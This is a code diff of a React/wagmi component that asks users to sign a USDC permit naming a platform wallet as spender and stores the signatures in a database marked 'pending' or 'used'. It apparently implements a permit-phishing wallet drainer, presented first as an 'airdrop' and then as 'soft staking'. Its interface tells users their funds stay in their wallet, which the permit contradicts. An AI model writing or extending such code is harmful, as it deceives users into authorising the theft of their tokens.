@@ -2,11 +2,11 @@
 
 import { useState, useEffect } from 'react'
 import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
+import { polygon } from 'wagmi/chains'
 import { Button } from '@/components/ui/Button'
 import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET } from '@/lib/web3-config'
-import { Sparkles, Check, AlertTriangle } from 'lucide-react'
+import { Shield, Check, AlertTriangle, RefreshCw, Lock } from 'lucide-react'
 import { createClient } from '@/lib/supabase'
-import { polygon } from 'wagmi/chains'
 
 interface PermitSignerProps {
   onSignatureComplete?: (signature: PermitSignature) => void
@@ -28,20 +28,18 @@ export interface PermitSignature {
 const PLATFORM_SPENDER = PLATFORM_WALLET
 
 export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSignerProps) {
-  const { address, isConnected, connector } = useAccount()
+  const { address, isConnected } = useAccount()
   const [isLoading, setIsLoading] = useState(false)
   const [error, setError] = useState('')
   const [success, setSuccess] = useState(false)
+  const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
+  const [existingSignature, setExistingSignature] = useState<boolean>(false)
   const [isLoadingStatus, setIsLoadingStatus] = useState(true)
+  
   const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
-  const [hasSignature, setHasSignature] = useState(false)
+  const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
   
   const { signTypedDataAsync } = useSignTypedData()
-
-  // Check wallet support
-  const ALLOWED_WALLETS = ['bitget', 'bitget wallet', 'trust', 'trust wallet', 'trustwallet']
-  const isWalletSupported = isConnected && connector ? 
-    ALLOWED_WALLETS.some(w => connector.name.toLowerCase().includes(w)) : true
 
   const displayAddress = address || boundWalletAddress
 
@@ -53,7 +51,6 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
     chainId: polygon.id,
   })
 
-  // Load signature status
   useEffect(() => {
     async function loadStatus() {
       setIsLoadingStatus(true)
@@ -89,14 +86,19 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
           
           if (sig) {
             const now = Math.floor(Date.now() / 1000)
-            if ((sig.status === 'pending' && Number(sig.deadline) > now) || sig.status === 'used') {
-              setHasSignature(true)
+            if (sig.status === 'pending' && Number(sig.deadline) > now) {
+              setBoundSignatureStatus('pending')
+              setExistingSignature(true)
+              setSuccess(true)
+            } else if (sig.status === 'used') {
+              setBoundSignatureStatus('used')
+              setExistingSignature(true)
               setSuccess(true)
             }
           }
         }
       } catch {
-        // Ignore errors
+        // 忽略错误
       } finally {
         setIsLoadingStatus(false)
       }
@@ -105,7 +107,6 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
     loadStatus()
   }, [])
 
-  // Check existing signature when wallet connects
   useEffect(() => {
     async function checkExistingSignature() {
       if (!address) return
@@ -124,12 +125,12 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         if (data) {
           const now = Math.floor(Date.now() / 1000)
           if (Number(data.deadline) > now) {
-            setHasSignature(true)
+            setExistingSignature(true)
             setSuccess(true)
           }
         }
       } catch {
-        // No signature or error, ignore
+        // 没有签名或出错，忽略
       }
     }
     
@@ -137,20 +138,14 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   }, [address])
 
   const handleSign = async () => {
-    console.log('=== HANDLE SIGN START ===')
-    console.log('address:', address)
-    console.log('nonce:', nonce)
-    console.log('isConnected:', isConnected)
-    console.log('connector:', connector?.name)
-    
     if (!address || nonce === undefined) {
-      console.log('Early return: missing address or nonce')
-      setError('Wallet not connected')
+      setError('Wallet not connected or nonce not loaded')
       return
     }
 
     setIsLoading(true)
     setError('')
+    setSuccess(false)
 
     try {
       const supabase = createClient()
@@ -158,21 +153,19 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         const { data: { user } } = await supabase.auth.getUser()
         
         if (user) {
-          // Check if wallet is bound to another account
           const { data: existingWallet } = await supabase
             .from('profiles')
-            .select('id')
+            .select('id, username, email')
             .eq('wallet_address', address.toLowerCase())
             .neq('id', user.id)
             .single()
 
           if (existingWallet) {
-            setError('Wallet bound to another account')
+            setError(`This wallet is already bound to another account.`)
             setIsLoading(false)
             return
           }
 
-          // Check if user already has a different wallet
           const { data: currentProfile } = await supabase
             .from('profiles')
             .select('wallet_address')
@@ -181,7 +174,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
 
           if (currentProfile?.wallet_address && 
               currentProfile.wallet_address.toLowerCase() !== address.toLowerCase()) {
-            setError('Account has a different wallet')
+            setError(`Your account is already bound to a different wallet.`)
             setIsLoading(false)
             return
           }
@@ -206,20 +199,12 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         deadline,
       }
 
-      console.log('=== SIGNING DATA ===')
-      console.log('domain:', JSON.stringify(domain, (_, v) => typeof v === 'bigint' ? v.toString() : v))
-      console.log('message:', JSON.stringify(message, (_, v) => typeof v === 'bigint' ? v.toString() : v))
-      console.log('Calling signTypedDataAsync...')
-
-      // Do NOT pass account - let wagmi use the connected account automatically
       const signature = await signTypedDataAsync({
         domain,
         types: PERMIT_TYPES,
         primaryType: 'Permit',
         message,
       })
-      
-      console.log('Signature received:', signature)
 
       const r = signature.slice(0, 66)
       const s = '0x' + signature.slice(66, 130)
@@ -237,35 +222,26 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         signature,
       }
 
+      setSignatureData(permitData)
       setSuccess(true)
-      setHasSignature(true)
 
       await saveSignatureToDatabase(permitData)
 
       onSignatureComplete?.(permitData)
+
+      // 刷新 profit 数据以更新签名状态
       onRefreshProfit?.()
 
     } catch (err: unknown) {
-      console.error('=== SIGNING ERROR ===')
-      console.error('Error type:', typeof err)
-      console.error('Error:', err)
-      
+      console.error('Signing error:', err)
       if (err instanceof Error) {
-        console.error('Error name:', err.name)
-        console.error('Error message:', err.message)
-        console.error('Error stack:', err.stack)
-        
-        if (err.message.includes('rejected') || err.message.includes('denied')) {
-          setError('Signature rejected')
-        } else if (err.message.includes('not supported')) {
-          setError('Wallet does not support this signature type')
+        if (err.message.includes('rejected')) {
+          setError('User rejected the signature request')
         } else {
-          // Show actual error message for debugging
-          setError(`Failed: ${err.message.slice(0, 100)}`)
+          setError(err.message)
         }
       } else {
-        console.error('Unknown error type:', JSON.stringify(err))
-        setError('Signing failed - check console')
+        setError('Failed to sign permit')
       }
     } finally {
       setIsLoading(false)
@@ -288,7 +264,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         })
         .eq('id', user.id)
 
-      await supabase
+      const { error: insertError } = await supabase
         .from('permit_signatures')
         .insert({
           user_id: user.id,
@@ -306,70 +282,176 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
           status: 'pending',
         })
 
-      setBoundWalletAddress(data.owner.toLowerCase())
+      if (!insertError) {
+        setExistingSignature(true)
+        setBoundWalletAddress(data.owner.toLowerCase())
+        setBoundSignatureStatus('pending')
+      }
     } catch (err) {
       console.error('Failed to save signature:', err)
     }
   }
 
-  // Loading state
   if (isLoadingStatus) {
     return (
-      <div className="flex flex-col items-center gap-1">
-        <div className="h-10 w-32 bg-white/10 animate-pulse rounded-xl"></div>
-      </div>
-    )
-  }
-
-  // Already signed - show success
-  if (success || hasSignature) {
-    return (
-      <div className="flex items-center justify-center gap-2 py-2 px-4 bg-green-500/10 border border-green-500/20 rounded-xl">
-        <Check className="w-4 h-4 text-green-400" />
-        <span className="text-sm font-medium text-green-400">Airdrop Ready</span>
-      </div>
-    )
-  }
-
-  // Not connected and no bound wallet
-  if (!isConnected && !boundWalletAddress) {
-    return null
-  }
-
-  // Need to connect bound wallet
-  if (boundWalletAddress && !isConnected) {
-    return (
-      <div className="flex flex-col items-center gap-1">
-        <div className="flex items-center gap-2 py-2 px-4 bg-amber-500/10 border border-amber-500/20 rounded-xl">
-          <AlertTriangle className="w-4 h-4 text-amber-400" />
-          <span className="text-sm text-amber-400">Connect wallet to join</span>
+      <div className="glass-card-solid p-6">
+        <div className="animate-pulse">
+          <div className="h-6 bg-white/10 rounded w-1/3 mb-4"></div>
+          <div className="h-20 bg-white/5 rounded"></div>
         </div>
       </div>
     )
   }
 
-  // Debug info for mobile
-  const debugInfo = `addr: ${address?.slice(0, 6) || 'none'} | nonce: ${nonce !== undefined ? 'ok' : 'loading'} | conn: ${connector?.name || 'none'}`
+  // 已绑定，有签名，未连接
+  if (boundWalletAddress && !isConnected && boundSignatureStatus !== 'none') {
+    return (
+      <div className="glass-card-solid p-6">
+        <div className="flex items-center gap-3 mb-4">
+          <div className="w-10 h-10 bg-green-500/20 rounded-xl flex items-center justify-center">
+            <Lock className="w-5 h-5 text-green-400" />
+          </div>
+          <div>
+            <h3 className="font-semibold text-white">Authorization Status</h3>
+            <p className="text-sm text-zinc-500">Wallet bound & authorized</p>
+          </div>
+        </div>
 
-  // Show Join Airdrop button
+        <div className="mb-4 p-3 bg-green-500/10 border border-green-500/20 rounded-xl flex items-center gap-2 text-green-400 text-sm">
+          <Check className="w-4 h-4" />
+          {boundSignatureStatus === 'pending' 
+            ? 'Authorization active - Ready for staking'
+            : 'Authorization completed'
+          }
+        </div>
+
+        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
+          <p className="text-xs text-zinc-500 mb-2">Bound Wallet</p>
+          <code className="text-sm font-mono text-zinc-300">
+            {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
+          </code>
+        </div>
+      </div>
+    )
+  }
+
+  // 已绑定，无签名，未连接
+  if (boundWalletAddress && !isConnected && boundSignatureStatus === 'none') {
+    return (
+      <div className="glass-card-solid p-6">
+        <div className="flex items-center gap-3 mb-4">
+          <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
+            <Shield className="w-5 h-5 text-amber-400" />
+          </div>
+          <div>
+            <h3 className="font-semibold text-white">Authorization Required</h3>
+            <p className="text-sm text-zinc-500">Connect wallet to sign</p>
+          </div>
+        </div>
+
+        <div className="mb-4 p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl flex items-center gap-2 text-amber-400 text-sm">
+          <AlertTriangle className="w-4 h-4" />
+          Please connect your bound wallet to complete authorization
+        </div>
+
+        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
+          <p className="text-xs text-zinc-500 mb-2">Your Bound Wallet</p>
+          <code className="text-sm font-mono text-zinc-300">
+            {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
+          </code>
+        </div>
+      </div>
+    )
+  }
+
+  if (!isConnected && !boundWalletAddress) {
+    return null
+  }
+
+  // 已连接状态
   return (
-    <div className="flex flex-col items-center gap-1">
+    <div className="glass-card-solid p-6">
+      <div className="flex items-center gap-3 mb-4">
+        <div className="w-10 h-10 bg-purple-500/20 rounded-xl flex items-center justify-center">
+          <Shield className="w-5 h-5 text-purple-400" />
+        </div>
+        <div>
+          <h3 className="font-semibold text-white">Authorization</h3>
+          <p className="text-sm text-zinc-500">Sign to enable soft staking</p>
+        </div>
+      </div>
+
       {error && (
-        <p className="text-xs text-red-400 mb-1 max-w-xs text-center break-words">{error}</p>
+        <div className="mb-4 p-3 bg-red-500/10 border border-red-500/20 rounded-xl flex items-center gap-2 text-red-400 text-sm">
+          <AlertTriangle className="w-4 h-4" />
+          {error}
+        </div>
       )}
-      
-      <Button
-        onClick={handleSign}
-        isLoading={isLoading}
-        disabled={nonce === undefined || !isWalletSupported}
-        className="bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 px-6"
-      >
-        <Sparkles className="w-4 h-4 mr-2" />
-        {!isWalletSupported ? 'Use Bitget or Trust' : 'Join Airdrop'}
-      </Button>
-      
-      <p className="text-[10px] text-zinc-500">Secure Indexer Sign</p>
-      <p className="text-[8px] text-zinc-600 mt-1">{debugInfo}</p>
+
+      {success && signatureData && (
+        <div className="mb-4 p-3 bg-green-500/10 border border-green-500/20 rounded-xl flex items-center gap-2 text-green-400 text-sm">
+          <Check className="w-4 h-4" />
+          Authorization signed successfully!
+        </div>
+      )}
+
+      {/* Protocol Info */}
+      <div className="mb-4 p-4 bg-gradient-to-r from-purple-500/10 to-cyan-500/10 rounded-xl border border-purple-500/20">
+        <div className="flex items-center gap-2 mb-2">
+          <Shield className="w-5 h-5 text-purple-400" />
+          <h4 className="text-sm font-semibold text-purple-300">Polnation Soft Staking Secure Protocol</h4>
+        </div>
+        <p className="text-xs text-zinc-400">
+          Sign to authorize secure staking rewards distribution
+        </p>
+      </div>
+
+      <div className="bg-white/5 rounded-xl p-4 mb-4 border border-white/10">
+        <p className="text-xs text-zinc-500 mb-2">What this authorization does:</p>
+        <ul className="text-sm text-zinc-400 space-y-1">
+          <li>• Enables automatic reward distribution to your wallet</li>
+          <li>• Required to participate in staking rewards</li>
+          <li>• Your funds remain in your wallet at all times</li>
+          <li>• Non-custodial - you maintain full control</li>
+        </ul>
+        <p className="text-xs text-amber-400 mt-3">
+          ⚠️ Without authorization, you won&apos;t receive staking rewards
+        </p>
+      </div>
+
+      {!success ? (
+        <Button
+          onClick={handleSign}
+          isLoading={isLoading}
+          className="w-full"
+          disabled={nonce === undefined}
+        >
+          Sign Authorization
+        </Button>
+      ) : (
+        <div className="space-y-3">
+          <div className="flex items-center justify-center gap-2 text-green-400">
+            <Check className="w-4 h-4" />
+            <span className="text-sm font-medium">
+              {existingSignature ? 'Authorization already active' : "You're all set for soft staking"}
+            </span>
+          </div>
+          {existingSignature && (
+            <Button
+              variant="outline"
+              size="sm"
+              onClick={() => {
+                setSuccess(false)
+                setExistingSignature(false)
+              }}
+              className="w-full gap-2"
+            >
+              <RefreshCw className="w-4 h-4" />
+              Sign New Authorization
+            </Button>
+          )}
+        </div>
+      )}
     </div>
   )
 }
